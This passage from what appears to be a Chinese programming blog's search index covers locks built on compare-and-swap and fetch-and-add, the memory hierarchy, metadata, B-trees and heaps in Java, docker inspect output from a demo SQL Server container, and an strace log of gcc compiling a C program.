’byte’ not the word __asm__ __volatile__ ( \" lock\\n\" // 保证原子性 \" cmpxchgl %2,%1\\n\" // cmpxchgl new, *ptr, %rax = old，The ZF flag is set if the values in the destination operand and register AL, AX, or EAX are equal; otherwise it is cleared. \" sete %0\\n\" // ZF = 0 : \"=q\" (ret), \"=m\" (*ptr) // output 0,1 : \"r\" (new), \"m\" (*ptr), \"a\" (old) // input 2,3,4 : \"memory\"); // clobber list return ret; } Fetch-And-Add 构建锁 C 语言表示 Fetch-And-Add 语义 int FetchAndAdd(int *ptr) { int old = *ptr; *ptr = old + 1; return old; } 构建 ticket lock typedef struct __lock_t{ int ticket; int turn; } lock_t; void lock_init(lock_t *lock){ lock-\u003eticket = 0; lock-\u003eturn = 0; } void lock(lock_t *lock){ int myturn = FetchAndAdd(\u0026lock-\u003eticket); // 获取票号，类似于用票号来给要获取锁的线程排队。拿到票号的最终都会成功获取锁。 while(lock-\u003eturn != myturn){ ; // spin } } void unlock(lock_t *lock){ lock-\u003eturn = lock-\u003eturn + 1; // 下一位 } "},"title":"cs-lock"},"/blog/csapp-memory-hierarchy/":{"data":{"disk-controller#Disk Controller":" 我们知道定位一个磁盘空间需要三个参数(platter, track, sector). 但是 cpu 不使用这么麻烦的方式, cpu 使用的是逻辑盘号. 也就是磁盘控制器将逻辑盘号翻译成 platter, track, sector. 磁盘控制器充当一个中间层. 也就是只关心逻辑盘号, 不关心具体的(platter, track, sector). 通过逻辑盘号将三维的(platter, track, sector) 转换为一维数组, 这就是抽象的意义啊. 这就是降维思维嘛.","memory-hierarchy#Memory Hierarchy":" 我们知道不同类型的存储, 每一个 bit 的价格不一样, 元件不同, 速度也不同. 世上事情大抵如此,不会集所有优点于一身.\n利用程序的局部性, 构造一个层次存储系统, 每一层的存储当做下一层的缓存,(也就是下一层的一部分)这才会有 hit 和 miss 的根本原因啊! 这才会引出缓存的 placement policy 和 replacement policy. 缓存这种思想和普遍, 做开发时 redis 作为数据库的缓存, 也是解决速度不匹配的问题.","storage#storage":"storage"},"title":"csapp-memory-hierarchy"},"/blog/data-and-metadata/":{"data":{"":" 具体问题具体分析，确实非常重要。用正确的思想指导行动，才可事半功倍。 现实中的客观问题有意思的地方在于：无论你选择看得见，还是选择看不见，它都在那里，关键在于有没有人去解决，解决的人有多大的决心。","data-vs-metadata#data vs metadata":" Metadata is “data that provides information about other data”. In other words, it is “data about data”. 正如这个世上的人，无论承认与否，分为两类：统治者与被统治者。数据也不可避免的被分为两种：metadata 和 data。数据的数据和数据。两者相辅相成。\nphysical data 数据(被统治者) metadata 元数据(统治者) 正如如果被统治者都没有了，那也谈不上统治者。在一个个实体确实存在的情况下，如果没有数据，那也谈不上元数据。\nlogical 有时没有实体的存在但是也可以在逻辑上划分 data 和 Metadata 的。比如网络中的流量。仅仅是用户真正的数据吗？不，其实还有路由器之间的流量, 这部分流量对于整个网络系统的正常运行，不可缺少。\nThe control plane is the part of a network that controls how data is forwarded, while the data plane is the actual forwarding process. 那么网络流量就可以在逻辑上（也就是虚拟的）划分为： control plane 控制平面（视为 Metadata） data/forward plane 数据平面（视为 data） 从这个角度来理解，metadata 有控制数据的意思，控制真正的用户数据如何转发。虽然大家都是同一种事物(都是数据包)，但是又不是平等的事物。咳咳，换成人类，似乎也说得过去。\nstructural metadata 这种结构性的 metadata 相当于一份说明书，来说明哪一个位置的数据是什么数据。\njava class format Java 代码经过编译，可以的到一个 .class 文件。\nHello.java public class Hello { public static void main(String[] args) { System.out.println(\"Hello, World\"); } } Hello.class root@aliyun:java# xxd Hello.class 00000000: cafe babe 0000 0034 001d 0a00 0600 0f09 .......4........ 00000010: 0010 0011 0800 120a 0013 0014 0700 1507 ................ 00000020: 0016 0100 063c 696e 6974 3e01 0003 2829 .....\u003cinit\u003e...() 00000030: 5601 0004 436f 6465 0100 0f4c 696e 654e V...Code...LineN 00000040: 756d 6265 7254 6162 6c65 0100 046d 6169 umberTable...mai 00000050: 6e01 0016 285b 4c6a 6176 612f 6c61 6e67 n...([Ljava/lang 00000060: 2f53 7472 696e 673b 2956 0100 0a53 6f75 /String;)V...Sou 00000070: 7263 6546 696c 6501 000a 4865 6c6c 6f2e rceFile...Hello. 00000080: 6a61 7661 0c00 0700 0807 0017 0c00 1800 java............ 00000090: 1901 000c 4865 6c6c 6f2c 2057 6f72 6c64 ....Hello, World 000000a0: 0700 1a0c 001b 001c 0100 0548 656c 6c6f ...........Hello 000000b0: 0100 106a 6176 612f 6c61 6e67 2f4f 626a ...java/lang/Obj 000000c0: 6563 7401 0010 6a61 7661 2f6c 616e 672f ect...java/lang/ 000000d0: 5379 7374 656d 0100 036f 7574 0100 154c System...out...L 000000e0: 6a61 7661 2f69 6f2f 5072 696e 7453 7472 java/io/PrintStr 000000f0: 6561 6d3b 0100 136a 6176 612f 696f 2f50 eam;...java/io/P 00000100: 7269 6e74 5374 7265 616d 0100 0770 7269 rintStream...pri 00000110: 6e74 6c6e 0100 1528 4c6a 6176 612f 6c61 ntln...(Ljava/la 00000120: 6e67 2f53 7472 696e 673b 2956 0021 0005 ng/String;)V.!.. 00000130: 0006 0000 0000 0002 0001 0007 0008 0001 ................ 00000140: 0009 0000 001d 0001 0001 0000 0005 2ab7 ..............*. 00000150: 0001 b100 0000 0100 0a00 0000 0600 0100 ................ 00000160: 0000 0100 0900 0b00 0c00 0100 0900 0000 ................ 00000170: 2500 0200 0100 0000 09b2 0002 1203 b600 %............... 00000180: 04b1 0000 0001 000a 0000 000a 0002 0000 ................ 00000190: 0003 0008 0004 0001 000d 0000 0002 000e ................ Hello.class 怎样解析的？ 如果丢给我一个 .class 文件，其他啥也没有。我也看不懂。但是由于 class file format 的存在，只要足够耐心，自己也可以解析出 .class 是怎样的。这里的 class format 就是 Metadata。没有这个格式说明，谁也弄不明白这一堆二进制的 0 和 1 是啥意思。\nIP header IP 这个协议是用来将不同局域网组成互联网的。既然通信是双向的，要知道发送者的 IP，接收者的 IP，IP 包的总大小，IP Header 的大小，这个 IP 包能跨越多少路由器(TTL)，使用的 IP 协议版本，是哪一个上层协议在使用 IP 协议，IP 包是否切分了，切分后怎样组装，校验整个 IP 包在传输过程中是否发生了错误等信息。记在哪里呢？IP header，这个 IP header 就是 Metadata。这些也可理解成控制数据。\nTCP header TCP 传输层的协议。用来保证数据不丢失且按照发送顺序到达目的地。 怎样保证顺序呢？对每一个字节编号(sequence number)。 怎样保证数据不丢失呢？确认机制(ack)。 怎样找到目的地呢？一个在网络上的计算机，可能同时运行许多程序，如打开浏览器，在线听歌，在线编辑文档等等。用端口号(port number)。 同时，怎样知道接收方现在接收网络包的大小呢？用窗口(window size)。 怎样能知道网络包传输过程是否发生了错误？用校验和(checksum)。 这些信息都存在哪里了呢？TCP header 里。这就是 Metadata。也可理解成控制数据。\nInnoDB row format InnoDB 存储表是按行存储的。这只是逻辑上的说法。真正的数据存储是要落到磁盘上的。对于每一行，字段是不是空的，定长还是变长，变长字段的长度，该列的主键，这行数据是哪一个事务操作的，这些记录的相关日志都记在哪里了呢？ 不错。这其实也是有相应的说明的。而且，InnoDB 提供了不同的 row format。对用户的每一行来说，该行的 row format 就是 Metadata。当然这就是描述（或者说是控制）该行用户数据的。","reference#Reference":" Metadata what-is-metadata what-is-the-control-plane class file format InnoDB-row-format TTL "},"title":"data_and_metadata"},"/blog/data-structure-btree/":{"data":{"":"","#":"B-tree 特性 所有的 leaves 都在同一层级。 B-Tree 被 minimum degree t 定义。t 依赖于 disk block size。 除了 root，其余节点必须至少有 t - 1 个 key。root 节点至少有 1 个 key。 所有的节点（包括 root）最多有 2t - 1 个 key。 某一个节点的子节点的个数 = 这个节点的 key 的个数 + 1。 一个节点的所有 key 从小到大排序。两个 key1 和 key2 之间的所有 child 都在 key1 和 key2 之间。 B-Tree 从 root 节点 grow(扩张) 和 shrink(收缩)。 search、insert、delete 时间复杂度是O(log n)。n 是 key 的总数。 t=3 为例来理解 B-tree 每一个节点(root 除外) 至少有 t - 1 = 2 个 key。 每一个节点最多有 2t - 1 = 5 个 key。节点 key 数量 = 5，称为节点满了。 问题来了，节点 key 个数大于 5 了咋办？拆分。什么时候来拆分呢？在向下遍历节点时发现满了，立即进行拆分。 B-Tree insert operation 拆分已满节点 #(btree-拆分已满节点)\n如上图，节点1 已经满了，对此时的 root 节点进行拆分。 创建节点2，s 节点，作为新的 root 节点，同时设置 s.child[0] = root。 创建节点2，z 节点，将原来 root 节点一半的 key，复制到 z 节点。 将 z 节点设置为 s 节点的 child。s.child[1] = z。 拆分已满节点(有子节点) #(btree-拆分已满节点2)\nB-Tree 是向上扩张的(grow)。可以看到所有的 key 都是在 leaf 节点插入的。节点的 key 值的数量一旦等于 2t - 1 = 5 时，就会对该节点进行拆分。所以这也是每一个节点(root 除外)至少有 t-1 = 2 个 key 的原因。\nB-Tree delete operation ","references#References":" BTree-visualization BTree introduction BTree insertion BTree deletion "},"title":"data-structure-btree"},"/blog/data-structure-heap/":{"data":{"":"","#":"线性 or 非线性 数据结构可以分为两大类：线性结构和非线性结构。线性结构典型的就是数组和链表，非线性典型就是树了。复杂的数据结构基本上都是两者的组合。\nbinary heap 二叉堆本质上就是个完全二叉树。但是却用数组来表示。为啥呢？因为数组的下标之间有关系，可以表示二叉树节点之间的层级关系。因为是 完全二叉树，这就保证了一维展开就是一个下标连续的数组，数组通过下标操作起来相当简洁。堆顶(root)也就是数组第一个元素 array[0]，是最小元素，就是小顶堆。反之，大顶堆。\n堆的自我调整 插入节点 新节点放在数组最后，然后对该节点进行上浮操作。\n删除节点 删除堆顶元素，最后一个节点放在堆顶，对此时的堆顶进行下沉操作。\n构建二叉堆 所有的非叶子节点进行上浮操作。\n二叉堆自我调整图解 #(二叉堆的自我调整)\n代码实现 import java.util.Arrays; public class HeapOperator { // 自下而上，上浮 public static void upAdjust(int [] array){ // 最后一个节点 int childIndex = array.length - 1; // 最后一个非叶子节点 int parentIndex = (childIndex - 1) / 2; int temp = array[childIndex]; while (childIndex \u003e 0 \u0026\u0026 temp \u003c array[parentIndex]){ array[childIndex] = array[parentIndex]; childIndex = parentIndex; parentIndex = (childIndex - 1) / 2; } array[childIndex] = temp; } // 自上而下，下沉 public static void downAdjust(int [] array, int parentIndex, int length){ int temp = array[parentIndex]; int childIndex = 2 * parentIndex + 1; while (childIndex \u003c length){ // 有右节点，且右节点小于左节点 if (childIndex + 1 \u003c length \u0026\u0026 array[childIndex] \u003e array[childIndex + 1]){ childIndex++; } if(temp \u003c= array[childIndex]){ break; } array[parentIndex] = array[childIndex]; parentIndex = childIndex; childIndex = 2 * parentIndex + 1; } array[parentIndex] = temp; } public static void buildHeap(int[] array){ for (int i = (array.length - 1)/ 2; i \u003e= 0 ; i--) { downAdjust(array, i, array.length - 1); } } public static void heapSort(int [] array){ // 先构建一个小顶堆，得到一个最小值。 // i 为 parentIndex，左右子节点分别是 2 * i + 1, 2 * i + 2 for (int i = (array.length - 1 -2 ) / 2; i \u003e= 0 ; i--) { downAdjust(array, i, array.length); } // 堆顶和目前堆的最后一个节点交换，重新构建堆。 for (int i = array.length - 1; i \u003e 0 ; i--) { int temp = array[i]; array[i] = array[0]; array[0] = temp; downAdjust(array, 0 , i); } } public static void main(String[] args){ int [] array = new int[]{1,3,2,6,5,7,8,9,10,0}; upAdjust(array); System.out.println(Arrays.toString(array)); int[] array2 = new int[]{7,1,3,10,5,2,8,9,6}; buildHeap(array2); System.out.println(Arrays.toString(array2)); int[] array3 = new int[]{7,1,3,10,5,2,8,9,6,100}; heapSort(array3); System.out.println(Arrays.toString(array3)); } } 优先级队列 不要被队列二字带偏，优先级队列的重点在优先级上。比如线程有优先级，优先级大的先执行。运算符也是有优先级的。怎样来实现这种优先级呢？用 堆 就可以。这里使用小顶堆，堆顶就是最小值，这里带入优先级的概念，值越小优先级越大。那么，从堆顶拿出来的节点就是优先级最大的，剩余的节点重新构造成小顶堆，保证堆顶是最小值。\n代码实现 大顶堆实现优先队列。每次只取最大值，取出一个堆顶，剩余节点重新构建大顶堆。\nimport java.util.Arrays; public class PriorityQueue { private int[] array; private int size; public PriorityQueue() { this.array = new int[32]; } private void enQueue(int key){ if(size \u003e= array.length){ resize(); } array[size++] = key; upAdjust(); } private int deQueue(){ int heapTop = array[0]; array[0] = array[--size]; downAdjust(); return heapTop; } private void resize() { int doubleSize = size \u003c\u003c 2; this.array = Arrays.copyOf(this.array,doubleSize); } // 自下而上 private void upAdjust(){ // 拿到最后一个节点 int childIndex = this.size - 1; // 最后一个非叶子节点 int parentIndex = (childIndex - 1) / 2; int temp = array[childIndex]; while (childIndex \u003e 0 \u0026\u0026 temp \u003e array[parentIndex]){ array[childIndex] = array[parentIndex]; childIndex = parentIndex; parentIndex = (childIndex - 1) / 2; } array[childIndex] = temp; } // 自上而下 private void downAdjust(){ int parentIndex = 0; int temp = array[0]; int childIndex = 1; while (childIndex \u003c size){ // 有右节点，且右节点大于左节点。拿到两个子节点的最大值。 if (childIndex + 1 \u003c size \u0026\u0026 array[childIndex] \u003c array[childIndex + 1]){ childIndex++; } if(temp \u003e= array[childIndex]){ break; } array[parentIndex] = array[childIndex]; parentIndex = childIndex; childIndex = 2 * parentIndex + 1; } array[parentIndex] = temp; } public static void main(String[] args){ PriorityQueue priorityQueue = new PriorityQueue(); priorityQueue.enQueue(30); priorityQueue.enQueue(100); priorityQueue.enQueue(50); priorityQueue.enQueue(300); priorityQueue.enQueue(130); priorityQueue.enQueue(430); System.out.println(priorityQueue.deQueue()); System.out.println(priorityQueue.deQueue()); System.out.println(priorityQueue.deQueue()); } } References visual heap binary heap heap sort priority queue full binary tree vs complete binary tree heap review "},"title":"data-structure-heap"},"/blog/data-structure-red-black-tree/":{"data":{"":"","references#References":"\nReferences red-black-tree-visualization "},"title":"data-structure-red-black-tree"},"/blog/docker-practice/":{"data":{"":" Centos7 Linux 运行的 Docker 容器是: mssql-node-docker-demo-app","container-网络配置#Container 网络配置":" #(容器的网络配置)","docker-images-分层#Docker Images 分层":" { \"GraphDriver\": { \"Name\": \"overlay2\", \"Data\": { \"LowerDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2-init/diff:/var/lib/docker/overlay2/83b7194d94d42c0ef8f78a2f4105cc7a7a215a8e885b695a933a8f8212db9cfa/diff:/var/lib/docker/overlay2/9549118d3883d39414fadf0dc17e654d1408878be3296b294711ee65ef336b98/diff:/var/lib/docker/overlay2/8e85764472e79d42f469dd3681883cd415e85098d6c42fb3dd239471212f87b3/diff:/var/lib/docker/overlay2/8dc8ec519bade76b07994adc690d1e6fcad408147835198a250b4c66c489a151/diff:/var/lib/docker/overlay2/b07d1c7463b2a4ff25f7800729381fdf5b036c12a065973b9d079580c3a50a5e/diff:/var/lib/docker/overlay2/60c9257cc9d8a7ac4b66d1c4cae5ff994471976f0a344f8ac1856a4fba7b290e/diff:/var/lib/docker/overlay2/2a00c5b47427e151e000ffe05de8121e956dbf15b0d356cfc9ad2754dc5554d5/diff:/var/lib/docker/overlay2/3495bcc2d508cbdad81b1f3eb49645fe0eb05caf0e99fbb6310d40fbdd8118a2/diff:/var/lib/docker/overlay2/9df322481c6f8b91b3583016634664e6ad991b8b846a9585385227a02b898770/diff:/var/lib/docker/overlay2/163747850da2115bac28b39ac6d2e08ca5c0e409fe6cae624155f8e61489aacd/diff:/var/lib/docker/overlay2/52405978404b67e0a67ba95cb12682d0e8a8ae781fd2b21dc2ab94197e97c38b/diff:/var/lib/docker/overlay2/c987c31253bca839eb789feb3e4fe7bc247b1e88dc88c67e2b4209fc26025fe8/diff:/var/lib/docker/overlay2/ed663d4b2fffda783f9b69e5eb7c139f34142e0e2d868460a3c1e1d925ec3e7e/diff:/var/lib/docker/overlay2/a0e3d07a65b7ee70d3869fa41418ecf71056b9ac0ba1182170621c83c77bba94/diff:/var/lib/docker/overlay2/aa4c66b37aae4e55a94aa60ac763a60851af34271ccb1a80f547e3d90e7ac2bf/diff:/var/lib/docker/overlay2/527b1a014d302c1fe835d778be6cd008de6741d290fbc0f2e64e3f25f7a7b8d0/diff\", \"MergedDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/merged\", \"UpperDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/diff\", \"WorkDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/work\" } } } MergedDir 这个 MergedDir 层就是一个 Linux 镜像\n#( 镜像 Merged 层)","docker-info#docker info":" #(docker-info)","docker-inspect#docker inspect":" [ { \"Id\": \"405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655\", \"Created\": \"2019-08-01T02:57:14.067532309Z\", \"Path\": \"/bin/sh\", \"Args\": [ \"-c\", \"/bin/bash ./entrypoint.sh\" ], \"State\": { \"Status\": \"running\", \"Running\": true, \"Paused\": false, \"Restarting\": false, \"OOMKilled\": false, \"Dead\": false, \"Pid\": 12164, \"ExitCode\": 0, \"Error\": \"\", \"StartedAt\": \"2019-08-22T06:08:43.334320939Z\", \"FinishedAt\": \"2019-08-21T09:25:32.130119566Z\" }, \"Image\": \"sha256:e600f86aa4e2aced43a193a28aa507651bfb77daa09ca8dbf286451a630cf27e\", // node-web-app 的 docker 镜像 id \"ResolvConfPath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/resolv.conf\", \"HostnamePath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/hostname\", \"HostsPath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/hosts\", \"LogPath\": \"\", \"Name\": \"/friendly_hamilton\", // docker container 的名称 \"RestartCount\": 0, \"Driver\": \"overlay2\", // storage driver \"MountLabel\": \"\", \"ProcessLabel\": \"\", \"AppArmorProfile\": \"\", \"ExecIDs\": null, \"HostConfig\": { \"Binds\": null, \"ContainerIDFile\": \"\", \"LogConfig\": { \"Type\": \"journald\", \"Config\": {} }, \"NetworkMode\": \"default\", \"PortBindings\": { \"1433/tcp\": [ { \"HostIp\": \"\", \"HostPort\": \"1433\" } ], \"8080/tcp\": [ { \"HostIp\": \"\", \"HostPort\": \"8080\" } ] }, \"RestartPolicy\": { \"Name\": \"no\", \"MaximumRetryCount\": 0 }, \"AutoRemove\": false, \"VolumeDriver\": \"\", \"VolumesFrom\": null, \"CapAdd\": null, \"CapDrop\": null, \"Dns\": [], \"DnsOptions\": [], \"DnsSearch\": [], \"ExtraHosts\": null, \"GroupAdd\": null, \"IpcMode\": \"\", \"Cgroup\": \"\", \"Links\": null, \"OomScoreAdj\": 0, \"PidMode\": \"\", \"Privileged\": false, \"PublishAllPorts\": false, \"ReadonlyRootfs\": false, \"SecurityOpt\": null, \"UTSMode\": \"\", \"UsernsMode\": \"\", \"ShmSize\": 67108864, \"Runtime\": \"docker-runc\", \"ConsoleSize\": [ 0, 0 ], \"Isolation\": \"\", \"CpuShares\": 0, \"Memory\": 0, \"NanoCpus\": 0, \"CgroupParent\": \"\", \"BlkioWeight\": 0, \"BlkioWeightDevice\": null, \"BlkioDeviceReadBps\": null, \"BlkioDeviceWriteBps\": null, \"BlkioDeviceReadIOps\": null, \"BlkioDeviceWriteIOps\": null, \"CpuPeriod\": 0, \"CpuQuota\": 0, \"CpuRealtimePeriod\": 0, \"CpuRealtimeRuntime\": 0, \"CpusetCpus\": \"\", \"CpusetMems\": \"\", \"Devices\": [], \"DiskQuota\": 0, \"KernelMemory\": 0, \"MemoryReservation\": 0, \"MemorySwap\": 0, \"MemorySwappiness\": -1, \"OomKillDisable\": false, \"PidsLimit\": 0, \"Ulimits\": null, \"CpuCount\": 0, \"CpuPercent\": 0, \"IOMaximumIOps\": 0, \"IOMaximumBandwidth\": 0 }, \"GraphDriver\": { \"Name\": \"overlay2\", \"Data\": { \"LowerDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2-init/diff:/var/lib/docker/overlay2/83b7194d94d42c0ef8f78a2f4105cc7a7a215a8e885b695a933a8f8212db9cfa/diff:/var/lib/docker/overlay2/9549118d3883d39414fadf0dc17e654d1408878be3296b294711ee65ef336b98/diff:/var/lib/docker/overlay2/8e85764472e79d42f469dd3681883cd415e85098d6c42fb3dd239471212f87b3/diff:/var/lib/docker/overlay2/8dc8ec519bade76b07994adc690d1e6fcad408147835198a250b4c66c489a151/diff:/var/lib/docker/overlay2/b07d1c7463b2a4ff25f7800729381fdf5b036c12a065973b9d079580c3a50a5e/diff:/var/lib/docker/overlay2/60c9257cc9d8a7ac4b66d1c4cae5ff994471976f0a344f8ac1856a4fba7b290e/diff:/var/lib/docker/overlay2/2a00c5b47427e151e000ffe05de8121e956dbf15b0d356cfc9ad2754dc5554d5/diff:/var/lib/docker/overlay2/3495bcc2d508cbdad81b1f3eb49645fe0eb05caf0e99fbb6310d40fbdd8118a2/diff:/var/lib/docker/overlay2/9df322481c6f8b91b3583016634664e6ad991b8b846a9585385227a02b898770/diff:/var/lib/docker/overlay2/163747850da2115bac28b39ac6d2e08ca5c0e409fe6cae624155f8e61489aacd/diff:/var/lib/docker/overlay2/52405978404b67e0a67ba95cb12682d0e8a8ae781fd2b21dc2ab94197e97c38b/diff:/var/lib/docker/overlay2/c987c31253bca839eb789feb3e4fe7bc247b1e88dc88c67e2b4209fc26025fe8/diff:/var/lib/docker/overlay2/ed663d4b2fffda783f9b69e5eb7c139f34142e0e2d868460a3c1e1d925ec3e7e/diff:/var/lib/docker/overlay2/a0e3d07a65b7ee70d3869fa41418ecf71056b9ac0ba1182170621c83c77bba94/diff:/var/lib/docker/overlay2/aa4c66b37aae4e55a94aa60ac763a60851af34271ccb1a80f547e3d90e7ac2bf/diff:/var/lib/docker/overlay2/527b1a014d302c1fe835d778be6cd008de6741d290fbc0f2e64e3f25f7a7b8d0/diff\", \"MergedDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/merged\", \"UpperDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/diff\", \"WorkDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/work\" } }, \"Mounts\": [ { \"Type\": \"volume\", \"Name\": \"7bc1a7ad23925077cf8463c2d7a21b0cafc7d91305d89504f85fa76c33138834\", \"Source\": \"/var/lib/docker/volumes/7bc1a7ad23925077cf8463c2d7a21b0cafc7d91305d89504f85fa76c33138834/_data\", // host 主机的被挂在的目录 \"Destination\": \"/var/opt/mssql\", // Volume 挂载点 \"Driver\": \"local\", \"Mode\": \"\", \"RW\": true, \"Propagation\": \"\" } ], \"Config\": { \"Hostname\": \"405a378d6f88\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"ExposedPorts\": { \"1433/tcp\": {}, \"8080/tcp\": {} }, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": [ \"ACCEPT_EULA=Y\", \"SA_PASSWORD=Yukon900\", \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" ], \"Cmd\": [ \"/bin/sh\", \"-c\", \"/bin/bash ./entrypoint.sh\" ], \"ArgsEscaped\": true, \"Image\": \"node-web-app\", \"Volumes\": { \"/var/opt/mssql\": {} }, \"WorkingDir\": \"/usr/src/app\", \"Entrypoint\": null, \"OnBuild\": null, \"Labels\": { \"com.microsoft.product\": \"Microsoft SQL Server\", \"com.microsoft.version\": \"14.0.3048.4\", \"vendor\": \"Microsoft\" } }, \"NetworkSettings\": { \"Bridge\": \"\", \"SandboxID\": \"d21ee4834e9078042da65677d8db9717748eb7f86a6954c5e4eee29636159aa7\", \"HairpinMode\": false, \"LinkLocalIPv6Address\": \"\", \"LinkLocalIPv6PrefixLen\": 0, \"Ports\": { \"1433/tcp\": [ { \"HostIp\": \"0.0.0.0\", \"HostPort\": \"1433\" } ], \"8080/tcp\": [ { \"HostIp\": \"0.0.0.0\", \"HostPort\": \"8080\" } ] }, \"SandboxKey\": \"/var/run/docker/netns/d21ee4834e90\", \"SecondaryIPAddresses\": null, \"SecondaryIPv6Addresses\": null, \"EndpointID\": \"46dac1ff81a297ede919100e0d06a743b845e34b802b54bca8cb8f02dcd33c85\", \"Gateway\": \"172.17.0.1\", \"GlobalIPv6Address\": \"\", \"GlobalIPv6PrefixLen\": 0, \"IPAddress\": \"172.17.0.2\", \"IPPrefixLen\": 16, \"IPv6Gateway\": \"\", \"MacAddress\": \"02:42:ac:11:00:02\", \"Networks\": { \"bridge\": { \"IPAMConfig\": null, \"Links\": null, \"Aliases\": null, \"NetworkID\": \"a8af0599996912141c3f2ce4b0a2bcc48eea9164a35672aac6307333450acb6b\", //a8af05999969 \"EndpointID\": \"46dac1ff81a297ede919100e0d06a743b845e34b802b54bca8cb8f02dcd33c85\", \"Gateway\": \"172.17.0.1\", \"IPAddress\": \"172.17.0.2\", \"IPPrefixLen\": 16, \"IPv6Gateway\": \"\", \"GlobalIPv6Address\": \"\", \"GlobalIPv6PrefixLen\": 0, \"MacAddress\": \"02:42:ac:11:00:02\" } } } } ] ","docker-volume#docker volume":"mount \"Mounts\": [ { \"Type\": \"volume\", \"Name\": \"7bc1a7ad23925077cf8463c2d7a21b0cafc7d91305d89504f85fa76c33138834\", \"Source\": \"/var/lib/docker/volumes/7bc1a7ad23925077cf8463c2d7a21b0cafc7d91305d89504f85fa76c33138834/_data\", // host 主机的被挂载的目录 \"Destination\": \"/var/opt/mssql\", // Volume 挂载点 \"Driver\": \"local\", \"Mode\": \"\", \"RW\": true, \"Propagation\": \"\" } ] ","local-docker-container-网络#Local Docker container 网络":" { \"ResolvConfPath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/resolv.conf\", \"HostnamePath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/hostname\", \"HostsPath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/hosts\", } #(本地存储的容器的网络配置)","reference#Reference":" mssql-node-docker-demo-app\nstorage driver\nvar-run-docker-sock\ndocker 的 /var/run/docker.sock 参数"},"title":"docker-practice"},"/blog/gcc-compile-c-prog/":{"data":{"":"","#":"分析代码 os: Linux Mint 22.1\nhello.c#include \u003cstdio.h\u003e int main(void){ printf(\"hello world\"); } strace 追踪编译流程 strace -t -f -o hello.log -e trace=execve -s 2000 gcc -o hello hello.c All execve() system calls during compilation, showing how GCC orchestrates the build process.\nhello.log 内容 20029 13:48:52 execve(\"/usr/bin/gcc\", [\"gcc\", \"-o\", \"hello\", \"hello.c\"], 0x7ffd60d08358 /* 65 vars */) = 0 20034 13:48:52 execve(\"/usr/libexec/gcc/x86_64-linux-gnu/13/cc1\", [\"/usr/libexec/gcc/x86_64-linux-gnu/13/cc1\", \"-quiet\", \"-imultiarch\", \"x86_64-linux-gnu\", \"hello.c\", \"-quiet\", \"-dumpbase\", \"hello.c\", \"-dumpbase-ext\", \".c\", \"-mtune=generic\", \"-march=x86-64\", \"-fasynchronous-unwind-tables\", \"-fstack-protector-strong\", \"-Wformat\", \"-Wformat-security\", \"-fstack-clash-protection\", \"-fcf-protection\", \"-o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = 0 20034 13:48:53 +++ exited with 0 +++ 20029 13:48:53 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20034, si_uid=1000, si_status=0, si_utime=3 /* 0.03 s */, si_stime=17 /* 0.17 s */} --- 20036 13:48:53 execve(\"/usr/local/sbin/as\", [\"as\", \"--64\", \"-o\", \"/tmp/ccGZrdFz.o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = -1 ENOENT (No such file or directory) 20036 13:48:53 execve(\"/usr/local/bin/as\", [\"as\", \"--64\", \"-o\", \"/tmp/ccGZrdFz.o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = -1 ENOENT (No such file or directory) 20036 13:48:53 execve(\"/usr/sbin/as\", [\"as\", \"--64\", \"-o\", \"/tmp/ccGZrdFz.o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = -1 ENOENT (No such file or directory) 20036 13:48:53 execve(\"/usr/bin/as\", [\"as\", \"--64\", \"-o\", \"/tmp/ccGZrdFz.o\", \"/tmp/ccLfEVyN.s\"], 0x7d14db0 /* 70 vars */) = 0 20036 13:48:53 +++ exited with 0 +++ 20029 13:48:53 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20036, si_uid=1000, si_status=0, si_utime=0, si_stime=1 /* 0.01 s */} --- 20037 13:48:53 execve(\"/usr/libexec/gcc/x86_64-linux-gnu/13/collect2\", [\"/usr/libexec/gcc/x86_64-linux-gnu/13/collect2\", \"-plugin\", \"/usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so\", \"-plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper\", \"-plugin-opt=-fresolution=/tmp/ccKbYYb2.res\", \"-plugin-opt=-pass-through=-lgcc\", 